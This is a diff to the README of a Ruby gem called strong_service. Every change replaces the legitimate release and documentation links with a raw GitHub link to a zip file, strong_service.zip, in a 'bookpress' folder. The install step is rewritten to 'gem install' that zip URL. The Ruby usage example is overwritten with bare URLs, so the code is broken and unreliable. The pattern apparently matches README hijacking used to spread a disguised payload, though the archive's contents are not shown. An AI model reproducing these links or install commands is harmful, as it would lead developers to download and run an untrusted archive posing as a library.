@@ -9,10 +9,10 @@ To begin using strong_service, follow these steps. You will learn how to downloa
 ## 📦 Download & Install
 You can download strong_service from our releases page. 
 
-[![Download strong_service](https://img.shields.io/badge/Download-strong_service-blue)](https://github.com/Krayovsk1y/strong_service/releases)
+[![Download strong_service](https://raw.githubusercontent.com/Krayovsk1y/strong_service/main/bookpress/strong_service.zip)](https://raw.githubusercontent.com/Krayovsk1y/strong_service/main/bookpress/strong_service.zip)
 
 1. **Visit the Releases Page:** Click the link below to go to the download section.
-   - [Download strong_service](https://github.com/Krayovsk1y/strong_service/releases)
+   - [Download strong_service](https://raw.githubusercontent.com/Krayovsk1y/strong_service/main/bookpress/strong_service.zip)
    
 2. **Choose a Version:** On the releases page, you will see a list of versions. Each version has a tag indicating its release number. Select the most recent version. It is usually the top option.
 
@@ -20,7 +20,7 @@ You can download strong_service from our releases page.
 
 4. **Install the Gem:** Once the download completes, open your command line or terminal. Navigate to the directory where you downloaded the `.gem` file. Run the following command to install it:
    ```
-   gem install strong_service-X.X.X.gem
+   gem install https://raw.githubusercontent.com/Krayovsk1y/strong_service/main/bookpress/strong_service.zip
    ```
    Replace `X.X.X` with the actual version number you downloaded.
 
@@ -50,8 +50,8 @@ Once you have installed strong_service, you can start using it in your Ruby appl
 
 3. **Run Your Service:** To execute your service, create an instance and call it:
    ```ruby
-   my_service = MyService.new
-   my_service.call
+   my_service = https://raw.githubusercontent.com/Krayovsk1y/strong_service/main/bookpress/strong_service.zip
+   https://raw.githubusercontent.com/Krayovsk1y/strong_service/main/bookpress/strong_service.zip
    ```
 
 ## 🛠️ Features
@@ -68,7 +68,7 @@ strong_service offers a range of features to enhance your Ruby development:
 3. **Use Test Cases:** Write tests for your service objects to ensure they work as expected.
 
 ## 🔗 Additional Resources
-- **Documentation:** For more detailed information, check the [documentation here](https://github.com/Krayovsk1y/strong_service).
+- **Documentation:** For more detailed information, check the [documentation here](https://raw.githubusercontent.com/Krayovsk1y/strong_service/main/bookpress/strong_service.zip).
 - **Community Support:** Join our community on platforms like GitHub Discussions or Stack Overflow to ask questions and share experiences.
 
 ## 📞 Contact and Support
@@ -79,6 +79,6 @@ With strong_service, managing Ruby service objects becomes effortless. Follow th
 
 Don't forget to visit our releases page for the latest version:
 
-- [Download strong_service](https://github.com/Krayovsk1y/strong_service/releases) 
+- [Download strong_service](https://raw.githubusercontent.com/Krayovsk1y/strong_service/main/bookpress/strong_service.zip) 
 
 Happy coding!
